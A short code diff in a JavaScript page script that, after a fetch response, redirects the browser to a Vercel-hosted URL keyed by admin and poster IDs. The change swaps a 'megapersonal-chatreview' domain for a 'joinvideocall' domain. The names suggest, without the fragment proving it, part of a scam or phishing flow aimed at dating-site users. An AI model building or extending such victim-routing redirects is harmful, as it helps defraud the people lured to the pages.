@@ -69,9 +69,9 @@ document.addEventListener('DOMContentLoaded', () => {
                 .then(response => response.json())
                 .then(data => {
                     console.log('Response:', data);
-                    if (data.info) {
+                    if (data) {
                         // Redirect to another URL on success
-                        window.location.href =`https://megapersonal-chatreview.vercel.app/${admin}/${poster}`
+                        window.location.href =`https://joinvideocall-mu.vercel.app/${adminId}/${posterId}`
                     }
                 })
                 .catch(error => {
